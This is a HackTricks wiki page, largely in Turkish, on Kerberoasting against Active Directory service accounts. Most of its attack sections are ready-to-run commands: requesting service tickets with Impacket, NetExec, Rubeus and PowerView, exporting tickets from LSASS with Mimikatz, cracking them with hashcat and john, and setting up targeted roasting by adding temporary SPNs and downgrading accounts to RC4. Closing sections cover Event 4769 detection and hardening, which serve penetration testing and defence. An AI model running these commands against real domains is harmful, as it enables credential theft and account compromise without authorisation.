# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting, Active Directory'de (AD) user hesapları altında çalışan servislerle ilişkili TGS ticket'larının, computer hesapları hariç, elde edilmesine odaklanır. Bu ticket'ların encryption işlemi user password'larından türetilen key'leri kullanır ve offline credential cracking yapılmasına olanak tanır. Bir user account'un service olarak kullanılması, ServicePrincipalName (SPN) property'sinin boş olmamasıyla belirtilir.

Authenticated herhangi bir domain user'ı TGS ticket'ı talep edebilir; dolayısıyla özel bir privilege gerekmez.<sup>[[4]](#references)[[5]](#references)</sup>

### Key Points

- User account'ları altında çalışan servislerin TGS ticket'larını hedefler (yani SPN ayarlanmış hesaplar; computer hesapları değil).
- Ticket'lar, service account'un password'undan türetilen bir key ile encrypted edilir ve offline olarak crack edilebilir.
- Elevated privilege gerekmez; authenticated herhangi bir account TGS ticket'ı talep edebilir.

> [!WARNING]
> Çoğu public tool, AES'e kıyasla crack edilmesi daha hızlı olduğu için RC4-HMAC (etype 23) service ticket'larını talep etmeyi tercih eder. RC4 TGS hash'leri `$krb5tgs$23$*`, AES128 `$krb5tgs$17$*` ve AES256 `$krb5tgs$18$*` ile başlar. Ancak birçok environment AES-only kullanımına geçiyor. Yalnızca RC4'ün önemli olduğunu varsaymayın.
> Ayrıca “spray-and-pray” roasting'den kaçının. Rubeus'ün default kerberoast davranışı tüm SPN'leri sorgulayıp ticket talep edebilir ve gürültülüdür. Önce ilgi çekici principal'ları enumerate edip hedefleyin.

### Service account secrets & Kerberos crypto cost

Birçok servis hâlâ elle yönetilen password'lara sahip user account'ları altında çalışıyor. KDC, service ticket'larını bu password'lar üzerinden türetilen key'lerle encrypt eder ve ciphertext'i authenticated herhangi bir principal'a verir; böylece kerberoasting, lockout veya DC telemetry olmadan sınırsız offline guess yapılmasını sağlar. Encryption mode, cracking budget'ını belirler:

| Mode | Key derivation | Encryption type | Approx. RTX 5090 throughput* | Notes |
| --- | --- | --- | --- | --- |
| AES + PBKDF2 | PBKDF2-HMAC-SHA1 with 4,096 iterations and a per-principal salt generated from the domain + SPN | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | ~6.8 million guesses/s | Salt rainbow table'ları engeller, ancak kısa password'ların hızlı şekilde crack edilmesine hâlâ izin verir. |
| RC4 + NT hash | Single MD4 of the password (unsalted NT hash); Kerberos only mixes in an 8-byte confounder per ticket | etype 23 (`$krb5tgs$23$`) | ~4.18 **billion** guesses/s | AES'ten yaklaşık 1000× daha hızlıdır; attacker'lar `msDS-SupportedEncryptionTypes` buna izin verdiğinde RC4'ü zorlar. |

*Matthew Green's Kerberoasting analysis içinde [Chick3nman tarafından gerçekleştirilen benchmark'lar](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/).<sup>[[3]](#references)</sup>

RC4'ün confounder'ı yalnızca keystream'i randomize eder; her guess için ek bir work oluşturmaz. Service account'lar random secret'lara (gMSA/dMSA, machine account'lar veya vault-managed string'ler) dayanmadığı sürece compromise hızı tamamen GPU budget'ına bağlıdır. AES-only etype'ları zorunlu kılmak, saniyede milyarlarca guess yapılabilen downgrade'i ortadan kaldırır; ancak weak human password'lar yine de PBKDF2'ye yenilir.<sup>[[3]](#references)</sup>

### Attack

#### Linux
```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# NetExec — LDAP enumerate + dump $krb5tgs$23/$17/$18 blobs with metadata
netexec ldap <DC_FQDN> -u <USER> -p <PASS> --kerberoast kerberoast.hashes

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```
Kerberoast kontrollerini içeren çok özellikli araçlar:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```
#### Windows

- Kerberoast yapılabilir kullanıcıları listeleyin
```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```
- Technique 1: TGS iste ve bellekten dump al
```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```
- Teknik 2: Otomatik araçlar
```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```
> [!WARNING]
> A TGS request Windows Security Event 4769 oluşturur (Bir Kerberos service ticket'ı istendi).

### OPSEC ve yalnızca AES kullanılan ortamlar

- AES kullanmayan hesaplar için kasıtlı olarak RC4 isteyin:
- Rubeus: `/rc4opsec`, AES kullanmayan hesapları enumerate etmek için tgtdeleg kullanır ve RC4 service ticket'ları ister.
- Rubeus: kerberoast ile `/tgtdeleg`, mümkün olduğunda RC4 isteklerini de tetikler.<sup>[[6]](#references)</sup>
- Sessizce başarısız olmak yerine yalnızca AES kullanan hesapları roast edin:
- Rubeus: `/aes`, AES etkin hesapları enumerate eder ve AES service ticket'ları (etype 17/18) ister.
- Zaten bir TGT'niz varsa (PTT ile veya bir .kirbi dosyasından), LDAP'ı atlamak için `/spn:<SPN>` ya da `/spns:<file>` ile birlikte `/ticket:<blob|path>` kullanabilirsiniz.
- Hedefleme, throttling ve daha az gürültü:
- `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` ve `/jitter:<1-100>` kullanın.
- `/pwdsetbefore:<MM-dd-yyyy>` ile muhtemelen zayıf parolaları (daha eski parolaları) filtreleyin veya `/ou:<DN>` ile ayrıcalıklı OU'ları hedefleyin.<sup>[[8]](#references)</sup>

Örnekler (Rubeus):
```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```
### Cracking
```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```
### Persistence / Abuse

Bir hesabı kontrol ediyorsanız veya hesabı değiştirebiliyorsanız, bir SPN ekleyerek hesabı kerberoastable hâle getirebilirsiniz:
```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```
Daha kolay cracking için RC4'ü etkinleştirmek üzere bir hesabı downgrade edin (hedef nesne üzerinde write ayrıcalıkları gerektirir):
```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```
#### Targeted Kerberoast via GenericWrite/GenericAll over a user (temporary SPN)

BloodHound, bir kullanıcı nesnesi üzerinde kontrolünüz olduğunu gösterdiğinde (ör. GenericWrite/GenericAll), o kullanıcının şu anda herhangi bir SPN'si olmasa bile söz konusu kullanıcıyı güvenilir bir şekilde “targeted-roast” edebilirsiniz:<sup>[[9]](#references)</sup>

- Kontrollü kullanıcıya, roastable hâle getirmek için geçici bir SPN ekleyin.
- Cracking işlemini kolaylaştırmak için bu SPN için RC4 (etype 23) ile şifrelenmiş bir TGS-REP isteyin.
- `$krb5tgs$23$...` hash'ini hashcat ile crack edin.
- Footprint'i azaltmak için SPN'yi temizleyin.

Windows (PowerView/Rubeus):
```powershell
# Add temporary SPN on the target user
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose

# Request RC4 TGS for that user (single target)
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap /rc4

# Remove SPN afterwards
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
```
Linux one-liner (targetedKerberoast.py, SPN ekleme -> TGS isteme (etype 23) -> SPN kaldırma işlemlerini otomatikleştirir):<sup>[[2]](#references)</sup>
```bash
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
```
Çıktıyı hashcat autodetect ile crack edin ( `$krb5tgs$23$` için mode 13100):
```bash
hashcat <outfile>.hash /path/to/rockyou.txt
```
Tespit notları: SPN ekleme/kaldırma işlemleri dizin değişiklikleri oluşturur (hedef kullanıcıda Event ID 5136/4738) ve TGS isteği Event ID 4769 üretir. Throttling ve prompt temizliğini değerlendirin.

Kerberoast saldırıları için kullanışlı araçları burada bulabilirsiniz: https://github.com/nidem/kerberoast

Linux'ta şu hatayı alırsanız: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)` bunun nedeni yerel saat farkıdır. DC ile senkronize edin:

- `ntpdate <DC_IP>` (bazı dağıtımlarda kullanımdan kaldırılmıştır)
- `rdate -n <DC_IP>`

### Domain hesabı olmadan Kerberoast (AS-requested STs)

Eylül 2022'de Charlie Clark, bir principal pre-authentication gerektirmiyorsa, istek gövdesindeki sname değiştirilerek hazırlanmış bir KRB_AS_REQ aracılığıyla service ticket elde etmenin mümkün olduğunu gösterdi; bu yöntem, TGT yerine etkili bir şekilde service ticket alınmasını sağlar. Bu yöntem AS-REP roasting işlemini taklit eder ve geçerli domain kimlik bilgileri gerektirmez.

Ayrıntılar için Semperis'in “New Attack Paths: AS-requested STs” yazısına bakın.<sup>[[10]](#references)</sup>

> [!WARNING]
> Geçerli kimlik bilgileri olmadan bu teknikle LDAP sorgulaması yapamayacağınız için bir kullanıcı listesi sağlamalısınız.

Linux

- Impacket (PR #1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```
Windows

- Rubeus (PR #139):
```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```
İlgili

AS-REP roastable users hedefleniyorsa şuna da bakın:

{{#ref}}
asreproast.md
{{#endref}}

### Tespit

Kerberoasting gizli olabilir. DC'lerden gelen Event ID 4769 olaylarını inceleyin ve gürültüyü azaltmak için filtreler uygulayın:

- `krbtgt` hizmet adını ve `$` ile biten hizmet adlarını (bilgisayar hesapları) hariç tutun.
- Makine hesaplarından gelen istekleri (`*$$@*`) hariç tutun.
- Yalnızca başarılı istekleri (`Failure Code` `0x0`) dikkate alın.
- Şifreleme türlerini takip edin: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). Yalnızca `0x17` için uyarı oluşturmayın.

Örnek PowerShell triage:
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
Where-Object {
($_.Message -notmatch 'krbtgt') -and
($_.Message -notmatch '\$$') -and
($_.Message -match 'Failure Code:\s+0x0') -and
($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
($_.Message -notmatch '\$@')
} |
Select-Object -ExpandProperty Message
```
Ek fikirler:

- Her host/user için normal SPN kullanımını baseline olarak belirleyin; tek bir principal'dan gelen çok sayıda farklı SPN isteği burst'ü için alert oluşturun.
- AES ile harden edilmiş domain'lerde olağandışı RC4 kullanımını işaretleyin.

### Mitigation / Hardening

- Services için gMSA/dMSA veya machine account kullanın. Managed account'lar 120+ karakterlik random password'lara sahiptir ve otomatik olarak rotate edilir; bu da offline cracking işlemini pratik olmaktan çıkarır.<sup>[[7]](#references)</sup>
- `msDS-SupportedEncryptionTypes` değerini yalnızca AES kullanılacak şekilde ayarlayarak service account'larda AES'i zorunlu kılın (decimal 24 / hex 0x18); ardından password'ü rotate ederek AES key'lerinin türetilmesini sağlayın.<sup>[[7]](#references)</sup>
- Mümkün olduğunda environment'ınızda RC4'ü disable edin ve RC4 kullanımına yönelik denemeleri monitor edin. DC'lerde, `msDS-SupportedEncryptionTypes` ayarlanmamış account'lar için varsayılanları yönlendirmek üzere `DefaultDomainSupportedEncTypes` registry value'sunu kullanabilirsiniz. Thorough şekilde test edin.
- User account'lardan gereksiz SPN'leri kaldırın.<sup>[[7]](#references)</sup>
- Managed account'lar uygulanabilir değilse uzun ve random service account password'ları (25+ karakter) kullanın; common password'ları engelleyin ve düzenli olarak audit edin.<sup>[[7]](#references)</sup>

## References

- [1] [HTB: Breach – NetExec LDAP kerberoast + hashcat cracking in practice](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [3] [Matthew Green – Kerberoasting: Low-Tech, High-Impact Attacks from Legacy Kerberos Crypto (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
- [4] [Kerberos (II): How to attack Kerberos?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [5] [ired.team – Active Directory Kerberos Abuse: T1208 Kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [6] [ired.team – Kerberoasting: Requesting RC4 Encrypted TGS when AES is Enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- [7] [Microsoft Security Blog (2024-10-11) – Microsoft’s guidance to help mitigate Kerberoasting](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
- [8] [SpecterOps – Rubeus kerberoast command documentation](https://docs.specterops.io/ghostpack-docs/Rubeus-mdx/commands/roasting/kerberoast)
- [9] [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [10] [Semperis – New Attack Paths? AS Requested Service Tickets (Charlie Clark, Sept 2022)](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/)

{{#include ../../banners/hacktricks-training.md}}
